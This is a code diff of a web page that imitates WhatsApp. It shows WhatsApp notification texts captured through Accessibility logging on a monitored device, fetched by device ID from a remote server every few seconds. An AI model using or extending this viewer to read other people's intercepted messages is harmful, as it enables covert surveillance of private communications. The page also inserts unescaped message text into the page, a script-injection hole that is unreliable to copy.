@@ -15,13 +15,13 @@
             height: 100vh; 
             overflow: hidden; 
             display: flex;
-            justify-content: center;
+            justify-content: center; 
         }
 
         .app-container {
             width: 100%;
             height: 100%;
-            max-width: 450px;
+            max-width: 450px; 
             background-color: #111b21;
             position: relative;
             box-shadow: 0 0 20px rgba(0,0,0,0.5);
@@ -33,13 +33,10 @@
         #contactListView { display: flex; flex-direction: column; height: 100%; width: 100%; }
         
         .main-header {
-            padding: 15px; display: flex; align-items: center; gap: 15px;
+            padding: 15px; display: flex; justify-content: space-between; align-items: center;
             background-color: #202c33; border-bottom: 1px solid #2a3942; z-index: 5;
         }
-        
-        /* New Back Button Style */
-        .header-back-btn { font-size: 1.2rem; color: #aebac1; cursor: pointer; }
-        .app-title { font-size: 1.3rem; font-weight: bold; color: #8696a0; flex: 1; }
+        .app-title { font-size: 1.3rem; font-weight: bold; color: #8696a0; }
         .top-icons { display: flex; gap: 20px; color: #aebac1; font-size: 1.1rem; }
 
         .contact-list { flex: 1; overflow-y: auto; }
@@ -59,7 +56,7 @@
         .time { font-size: 0.75rem; color: #8696a0; }
         .last-msg { font-size: 0.85rem; color: #8696a0; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden; }
 
-        /* --- VIEW 2: CHAT CONVERSATION STYLE (Hidden Initially) --- */
+        /* --- VIEW 2: CHAT CONVERSATION STYLE --- */
         #chatDetailView { 
             display: none; 
             flex-direction: column; height: 100%; 
@@ -79,16 +76,15 @@
 
         .message { max-width: 75%; margin-bottom: 8px; padding: 6px 10px 8px 9px; border-radius: 8px; font-size: 0.9rem; position: relative; clear: both; line-height: 1.3; word-wrap: break-word;}
         
-        /* Incoming look for captured text */
-        .msg-left { background-color: #202c33; float: left; border-top-left-radius: 0; }
+        /* Default to Left (Received) because Accessibility logs captures incoming notifications mostly */
+        .msg-left { background-color: #202c33; float: left; border-top-left-radius: 0; color: #fff; }
+        .msg-sender-label { font-size: 0.75rem; color: #53bdeb; margin-bottom: 2px; font-weight: bold; display: block;}
         
         .msg-time { font-size: 0.65rem; color: #aebac1; float: right; margin-top: 5px; margin-left: 8px; display: flex; align-items: center; gap: 3px; }
 
         .chat-footer { background-color: #202c33; padding: 8px 10px; display: flex; align-items: center; gap: 10px; }
         .fake-input { flex: 1; background: #2a3942; padding: 10px 15px; border-radius: 20px; color: #8696a0; font-size: 0.95rem; }
 
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-thumb { background: #374045; border-radius: 2px; }
     </style>
 </head>
 <body>
@@ -97,17 +93,16 @@
         
         <div id="contactListView">
             <div class="main-header">
-                <i class="fa-solid fa-arrow-left header-back-btn" onclick="goBackToDashboard()"></i>
                 <span class="app-title">WhatsApp</span>
                 <div class="top-icons">
                     <i class="fa-solid fa-camera"></i>
                     <i class="fa-solid fa-magnifying-glass"></i>
-                    <i class="fa-solid fa-ellipsis-vertical"></i>
+                    <i class="fa-solid fa-ellipsis-vertical" onclick="location.reload()"></i>
                 </div>
             </div>
             
             <div class="contact-list" id="contactsContainer">
-                <p style="text-align: center; margin-top: 20px; color: #8696a0;">Loading chats...</p>
+                <p style="text-align:center; padding-top:20px; color:#8696a0">Loading chats...</p>
             </div>
         </div>
 
@@ -119,7 +114,6 @@
                 </div>
                 <div style="flex: 1;">
                     <h3 id="headerName" style="margin:0; font-size: 1rem; font-weight: 500;">User</h3>
-                    <p id="statusText" style="margin:0; font-size: 0.75rem; color: #aebac1;">Live Monitoring</p>
                 </div>
                 <i class="fa-solid fa-video" style="color: #aebac1; margin-right: 20px;"></i>
                 <i class="fa-solid fa-phone" style="color: #aebac1; margin-right: 15px;"></i>
@@ -131,7 +125,7 @@
 
             <div class="chat-footer">
                 <i class="fa-solid fa-plus" style="color: #8696a0; font-size: 1.2rem;"></i>
-                <div class="fake-input">Read Only Mode</div>
+                <div class="fake-input">Message</div>
                 <i class="fa-solid fa-microphone" style="color: #8696a0; font-size: 1.2rem;"></i>
             </div>
         </div>
@@ -139,157 +133,139 @@
     </div>
 
     <script>
-        // --- CONFIGURATION ---
-        const SERVER_URL = "https://child-v9no.onrender.com"; // Tumhara Render URL
-        const DEVICE_ID = localStorage.getItem('monitoring_id');
+        // --- LIVE SERVER LOGIC ---
 
-        // Agar ID nahi mili to wapas dashboard bhejo
+        const DEVICE_ID = localStorage.getItem('monitoring_id');
+        const SERVER_URL = "https://child-v9no.onrender.com/api/get_data";
+
         if (!DEVICE_ID) {
-            alert("Device ID missing!");
-            window.location.href = 'index.html';
+            alert("Device ID missing! Redirecting...");
+            window.location.href = 'index.html'; 
         }
 
-        // --- VARIABLES ---
-        let rawLogs = [];
-        let groupedChats = {}; 
-        let currentOpenChatApp = null; // Currently kaunsa chat khula hai
-        let refreshInterval = null;
+        let groupedChats = {}; // Object to store chats by Name
 
-        // --- DOM ELEMENTS ---
+        async function fetchWhatsAppData() {
+            try {
+                const response = await fetch(`${SERVER_URL}?device_id=${DEVICE_ID}&type=chat_logs`);
+                const result = await response.json();
+
+                if (result.status === 'success' && result.data) {
+                    processData(result.data);
+                }
+            } catch (error) {
+                console.error("Error fetching data:", error);
+                document.getElementById('contactsContainer').innerHTML = "<p style='text-align:center; color:#f15c6d'>Connection Failed</p>";
+            }
+        }
+
+        function processData(logs) {
+            groupedChats = {}; // Reset
+
+            // 1. Filter and Group Data
+            logs.forEach(log => {
+                // Sirf WhatsApp ka data lo
+                if (log.app === 'WhatsApp' || log.app === 'WhatsApp Business') {
+                    
+                    // 'Title' usually contains Sender Name in notification logs
+                    let senderName = log.title || "Unknown";
+                    
+                    // Ignore if title is just "WhatsApp" (means generic notification)
+                    if(senderName === "WhatsApp") senderName = "System/Status";
+
+                    // Create Group if not exists
+                    if (!groupedChats[senderName]) {
+                        groupedChats[senderName] = {
+                            name: senderName,
+                            lastMsg: "",
+                            time: "",
+                            messages: []
+                        };
+                    }
+
+                    // Add Message
+                    groupedChats[senderName].messages.push({
+                        text: log.text,
+                        timestamp: log.timestamp,
+                        timeStr: new Date(log.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+                    });
+
+                    // Update Last Message Info
+                    groupedChats[senderName].lastMsg = log.text;
+                    groupedChats[senderName].time = new Date(log.timestamp).toLocaleDateString();
+                }
+            });
+
+            renderContactList();
+        }
+
+        // --- UI RENDER LOGIC ---
+
         const contactListDiv = document.getElementById('contactsContainer');
         const chatViewDiv = document.getElementById('chatDetailView');
         const listViewDiv = document.getElementById('contactListView');
         const msgsDiv = document.getElementById('messagesContainer');
         const headerName = document.getElementById('headerName');
 
-        // --- 1. FETCH DATA FROM SERVER ---
-        async function fetchChats() {
-            try {
-                // Server se chat_logs mangwana
-                const response = await fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/chat_logs`);
-                const data = await response.json();
-
-                if (Array.isArray(data)) {
-                    rawLogs = data; // Data aa gaya
-                    processLogs();  // Data ko process karo
-                    updateUI();     // Screen update karo
-                }
-            } catch (error) {
-                console.error("Error fetching chats:", error);
-            }
-        }
-
-        // --- 2. PROCESS DATA (Group by App Name) ---
-        function processLogs() {
-            groupedChats = {};
-
-            // Logs latest pehle aate hain, hum unhe iterate karte hain
-            rawLogs.forEach(log => {
-                const appName = log.app || "Unknown";
-                
-                // Agar list me ye app nahi hai to banao
-                if (!groupedChats[appName]) {
-                    groupedChats[appName] = {
-                        name: appName,
-                        lastMsg: log.text,
-                        time: new Date(log.time || Date.now()).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
-                        messages: []
-                    };
-                }
-
-                // Message add karo
-                groupedChats[appName].messages.push({
-                    text: log.text,
-                    time: new Date(log.time || Date.now()).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
-                });
-            });
-        }
-
-        // --- 3. UPDATE UI (List & Detail) ---
-        function updateUI() {
-            // A. Update List View
+        function renderContactList() {
             contactListDiv.innerHTML = "";
-            const apps = Object.keys(groupedChats);
+            const names = Object.keys(groupedChats);
 
-            if (apps.length === 0) {
-                contactListDiv.innerHTML = "<p style='text-align:center; padding:20px; color:#888'>No data received yet.</p>";
-            } else {
-                apps.forEach(app => {
-                    const chat = groupedChats[app];
-                    contactListDiv.innerHTML += `
-                        <div class="contact-item" onclick="openChat('${app}')">
-                            <div class="dp-circle"><i class="fa-solid fa-user"></i></div>
-                            <div class="contact-info">
-                                <div class="row-top">
-                                    <span class="name">${chat.name}</span>
-                                    <span class="time">${chat.time}</span>
-                                </div>
-                                <div class="last-msg">${chat.lastMsg}</div>
+            if (names.length === 0) {
+                contactListDiv.innerHTML = "<p style='text-align:center; padding:20px; color:#8696a0'>No WhatsApp Chats Found</p>";
+                return;
+            }
+
+            names.forEach(name => {
+                const chat = groupedChats[name];
+                contactListDiv.innerHTML += `
+                    <div class="contact-item" onclick="openChat('${name}')">
+                        <div class="dp-circle"><i class="fa-solid fa-user"></i></div>
+                        <div class="contact-info">
+                            <div class="row-top">
+                                <span class="name">${chat.name}</span>
+                                <span class="time">${chat.time}</span>
                             </div>
+                            <div class="last-msg">${chat.lastMsg}</div>
                         </div>
-                    `;
-                });
-            }
-
-            // B. Update Open Chat (Agar koi khula hai to live update)
-            if (currentOpenChatApp && groupedChats[currentOpenChatApp]) {
-                renderMessages(groupedChats[currentOpenChatApp].messages);
-            }
-        }
-
-        // --- 4. CHAT OPEN/CLOSE LOGIC ---
-        
-        function openChat(appName) {
-            currentOpenChatApp = appName;
-            headerName.innerText = appName;
-            
-            // Messages dikhao
-            if (groupedChats[appName]) {
-                renderMessages(groupedChats[appName].messages);
-            }
-
-            // View switch
-            listViewDiv.style.display = 'none';
-            chatViewDiv.style.display = 'flex';
-        }
-
-        function renderMessages(msgs) {
-            // Note: Server 'Latest First' bhejta hai, Chat me 'Oldest First' dikhana hota hai
-            // Isliye hum array ko reverse karenge display ke liye
-            const sortedMsgs = [...msgs].reverse(); 
-
-            msgsDiv.innerHTML = "";
-            sortedMsgs.forEach(msg => {
-                msgsDiv.innerHTML += `
-                    <div class="message msg-left">
-                        ${msg.text}
-                        <span class="msg-time">${msg.time}</span>
                     </div>
                 `;
             });
+        }
+
+        function openChat(name) {
+            const chat = groupedChats[name];
             
-            // Auto scroll to bottom
-            msgsDiv.scrollTop = msgsDiv.scrollHeight;
+            if(chat) {
+                headerName.innerText = chat.name;
+                msgsDiv.innerHTML = "";
+                
+                // Sort messages by time (Oldest first)
+                chat.messages.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
+
+                chat.messages.forEach(msg => {
+                    msgsDiv.innerHTML += `
+                        <div class="message msg-left">
+                            ${msg.text}
+                            <span class="msg-time">${msg.timeStr}</span>
+                        </div>
+                    `;
+                });
+
+                listViewDiv.style.display = 'none';
+                chatViewDiv.style.display = 'flex';
+                msgsDiv.scrollTop = msgsDiv.scrollHeight;
+            }
         }
 
         function closeChat() {
-            currentOpenChatApp = null;
             chatViewDiv.style.display = 'none';
             listViewDiv.style.display = 'flex';
         }
 
-        // Back to Main Dashboard
-        function goBackToDashboard() {
-            window.location.href = 'index.html'; // Yahan apne dashboard file ka naam check karlena
-        }
-
-        // --- 5. INITIALIZATION ---
-        
-        // Pehli baar load karo
-        fetchChats();
-
-        // 1.5 Second ka Loop (Auto Refresh)
-        refreshInterval = setInterval(fetchChats, 1500);
+        // Auto Refresh Loop (Every 5 seconds)
+        fetchWhatsAppData();
+        setInterval(fetchWhatsAppData, 5000);
 
     </script>
 </body>
